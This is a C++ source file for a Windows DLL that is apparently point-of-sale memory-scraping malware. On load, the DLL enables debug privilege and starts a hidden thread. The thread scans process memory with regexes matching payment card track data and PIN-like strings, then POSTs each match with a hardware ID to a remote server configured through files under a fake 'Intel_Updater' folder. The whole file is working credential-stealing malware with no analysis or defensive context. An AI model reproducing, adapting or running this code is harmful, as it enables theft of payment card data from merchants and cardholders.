// Hack_Dll.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "Hack_Dll.h"
#include "Logger.h"

#include <boost/regex.hpp>

#include <algorithm>
#include <PROCESS.H>
#include <psapi.h>

#include <string>
#include <vector>
#include <windows.h>

#include <iostream>
#include <fstream>
#include <string>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

using namespace std;

BEGIN_MESSAGE_MAP(CHack_DllApp, CWinApp)
//{{AFX_MSG_MAP(CHack_DllApp)
// NOTE - the ClassWizard will add and remove mapping macros here.
//    DO NOT EDIT what you see in these blocks of generated code!
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

#define PROC_LIST_FILE_PATH _T("C:\\Windows\\Intel_Updater\\Intel.txt")
#define SERVER_FILE_PATH _T("C:\\Windows\\Intel_Updater\\Server.txt")
#define	DUMP_PATH		"C:\\Windows\\Intel_Updater\\Pattern.txt"

boost::regex pattern_1("(3|4|5|6)([0-9]{12,17})=([0-9]{12,20})", boost::regex::normal | boost::regbase::icase);
boost::regex pattern_2("4:([0-9]{3,4})", boost::regex::normal | boost::regbase::icase);

#define BUFFER_SIZE		1024
#define	OFFSET_DELTA	64		// Offset delta for missing pattern between buf slices

char* pbuf;
list<string> m_listProcName;
string m_strHWID = "Undefined";
string m_strServerIP = _T("127.0.0.1");
int m_nPort = 80;
string m_strSubUrl = _T("/Dll_Inject_Server/api/index.php");

//Get all module related info, this will include the base DLL. 
//and the size of the module
void GetProcNameList(){
	m_listProcName.clear();
	string strProcName;
	ifstream fProclist (PROC_LIST_FILE_PATH);
	if (fProclist.is_open())
	{
		while ( getline (fProclist,strProcName) )
		{
			m_listProcName.push_front(strProcName);
		}
		fProclist.close();
	}
}

void GetIPAddress(){
	ifstream fIPAddress (SERVER_FILE_PATH);
	if (fIPAddress.is_open())
	{
		getline (fIPAddress, m_strServerIP);
		getline (fIPAddress, m_strSubUrl);
		fIPAddress.close();
	}
}

void GetHWID(){
	HW_PROFILE_INFO hwProfileInfo;
	if (GetCurrentHwProfile(&hwProfileInfo))
		m_strHWID = hwProfileInfo.szHwProfileGuid;
}
MODULEINFO GetModuleInfo()
{
	MODULEINFO modinfo = {0};
	try{
		if (m_listProcName.size() != 0){
			list<string>::iterator it;
			for(it=m_listProcName.begin();it!=m_listProcName.end();it++){
				string strModuleName = (string)(*it);
				HMODULE hModule = GetModuleHandle(strModuleName.c_str());
				if(hModule == 0) continue;
				GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO));
				return modinfo;
			}
		}
	}
	catch (CMemoryException*)
	{
		//log_error(L"GetModuleInfo MemoryException");
	}
	catch (CFileException*)
	{
		//log_error(L"GetModuleInfo FileException");
	}
	catch (CException*)
	{
		//log_error(L"GetModuleInfo UnknownException");
	}
	return modinfo;	
}


void UploadPattern(string strPattern){
	try{
		CString strHeaders = _T("Content-Type: application/x-www-form-urlencoded");
		LPCTSTR pstrServer = m_strServerIP.c_str();
		INTERNET_PORT nPort = 80;
		CInternetSession session(_T("MySession"));
		CString strFormData = _T("command=save_inject_data&HWID=") + CString(m_strHWID.c_str()) + _T("&Pattern=") + CString(strPattern.c_str());
		//strFormData.Format(_T("command=save_inject_data&HWID=%s&Pattern=%s"), m_strHWID, strPattern);
		CHttpConnection *pConnection = session.GetHttpConnection(pstrServer, nPort, NULL, NULL);
		CHttpFile *pFile = pConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST, m_strSubUrl.c_str());
		pFile->AddRequestHeaders(strHeaders);
		BOOL result = pFile->SendRequest(strHeaders, (LPVOID) (LPCTSTR) strFormData, strFormData.GetLength());
		
		DWORD dwRet;
		pFile->QueryInfoStatusCode(dwRet);
		char szBuff[1024];
		CString out;
		if (dwRet == HTTP_STATUS_OK)
		{
			UINT nRead = pFile->Read(szBuff, 1023);
			while (nRead > 0)
			{
				//read file...
				out = CString(szBuff);
				break;
			}
		}
		
		session.Close();
	}
	catch (CMemoryException*)
	{
		//log_error(L"Thread_Proc MemoryException");
	}
	catch (CFileException*)
	{
		//log_error(L"Thread_Proc FileException");
	}
	catch (CException*)
	{
		//log_error(L"Thread_Proc UnknownException");
	}
}
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	try{
		TOKEN_PRIVILEGES tp;
		HANDLE hToken;
		LUID luid;
		
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
			&hToken))
		{
			printf("OpenProcessToken error: %u\n", GetLastError());
			return FALSE;
		}
		
		if (!LookupPrivilegeValue(NULL,             // lookup privilege on local system
			lpszPrivilege,    // privilege to lookup 
			&luid))          // receives LUID of privilege
		{
			printf("LookupPrivilegeValue error: %u\n", GetLastError());
			return FALSE;
		}
		
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		if (bEnablePrivilege)
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			tp.Privileges[0].Attributes = 0;
		
		// Enable the privilege or disable all privileges.
		if (!AdjustTokenPrivileges(hToken,
			FALSE,
			&tp,
			sizeof(TOKEN_PRIVILEGES),
			(PTOKEN_PRIVILEGES)NULL,
			(PDWORD)NULL))
		{
			printf("AdjustTokenPrivileges error: %u\n", GetLastError());
			return FALSE;
		}
		
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			printf("The token does not have the specified privilege. \n");
			return FALSE;
		}
		
		return TRUE;
	}
	catch (CMemoryException*)
	{
		//log_error(L"SetPrivilege MemoryException");
	}
	catch (CFileException*)
	{
		//log_error(L"SetPrivilege FileException");
	}
	catch (CException*)
	{
		//log_error(L"SetPrivilege UnknownException");
	}
	return FALSE;
}

void readProcessMemory_2()
{
	//FARPROC pFunc;
	DWORD dwOldProtect;
	try
	{
		DWORD pid = GetCurrentProcessId();
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
		if (!hProcess) {
			return;
		}

		HMODULE hModule = GetModuleHandle(NULL);
		if (!hModule) {
			return;
		}
		
		// Get all module related information
		MODULEINFO mInfo = GetModuleInfo();
		
		DWORD image_size = mInfo.SizeOfImage;
		LPVOID base_address = mInfo.lpBaseOfDll/*(LPVOID)hModule*/;
		
		DWORD offset = 0;				
		
		FILE* fd = fopen(DUMP_PATH, "a+");
		if (fd != NULL) fclose(fd);
		while (offset < image_size) {
			// Read all process memory
			DWORD buf_size = min(BUFFER_SIZE, image_size - offset);		
			memset(pbuf, 0, buf_size);
			// Add memory write attribute 
			//VirtualProtect((LPVOID)((char*)base_address + offset), buf_size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
			memcpy(pbuf, (LPVOID)((char*)base_address + offset), buf_size);
			// Restore memory attribute
			//VirtualProtect((LPVOID)((char*)base_address + offset), buf_size, dwOldProtect, &dwOldProtect);
			
			
			// Convert buf to string
			std::string buf_str;

			// Find pattern1
			boost::sregex_token_iterator iter_1(pbuf, pbuf + buf_size - 1, pattern_1, 0);
			boost::sregex_token_iterator end;
			for( ; iter_1 != end; ++iter_1 ) {
				buf_str = *iter_1;
				UploadPattern(buf_str);
			}

			// Find pattern2
			boost::sregex_token_iterator iter_2(pbuf, pbuf + buf_size - 1, pattern_2, 0);
			for( ; iter_2 != end; ++iter_2 ) {
				buf_str = *iter_2;
				UploadPattern(buf_str);
			}
			
			if (buf_size > OFFSET_DELTA) {
				offset += (buf_size - OFFSET_DELTA);
			} else {
				offset += buf_size;
			}
		}	

		CloseHandle(hProcess);
	}
	catch (CMemoryException*)
	{
		//log_error(L"readProcessMemory_2 MemoryException");
	}
	catch (CFileException*)
	{
		//log_error(L"readProcessMemory_2 FileException");
	}
	catch (CException*)
	{
		//log_error(L"readProcessMemory_2 UnknownException");
	}
}

/////////////////////////////////////////////////////////////////////////////
// CHack_DllApp construction
DWORD WINAPI Thread_Proc(void *param){
	DWORD start_tick = GetTickCount();
	while (TRUE)
	{
		try{
			if (GetTickCount() > start_tick + 500) {
				readProcessMemory_2();
				start_tick = GetTickCount();
			}
			//readProcessMemory_1();
		}
		catch (CMemoryException*)
		{
			//log_error(L"Thread_Proc MemoryException");
		}
		catch (CFileException*)
		{
			//log_error(L"Thread_Proc FileException");
		}
		catch (CException*)
		{
			//log_error(L"Thread_Proc UnknownException");
		}
	}
}

HANDLE hThread;

CHack_DllApp::CHack_DllApp()
{
	GetProcNameList();
	GetIPAddress();
	GetHWID();
	SetPrivilege(SE_DEBUG_NAME, TRUE);
	pbuf = new char[BUFFER_SIZE];
	hThread = ::CreateThread(NULL, 0, Thread_Proc, NULL, 0, NULL);
	if (hThread) {
		::SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);
	}
}

CHack_DllApp::~CHack_DllApp()
{
	if (hThread) {
		CloseHandle(hThread);
	}
	if (pbuf) {
		delete[] pbuf;
	}
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CHack_DllApp object

CHack_DllApp theApp;
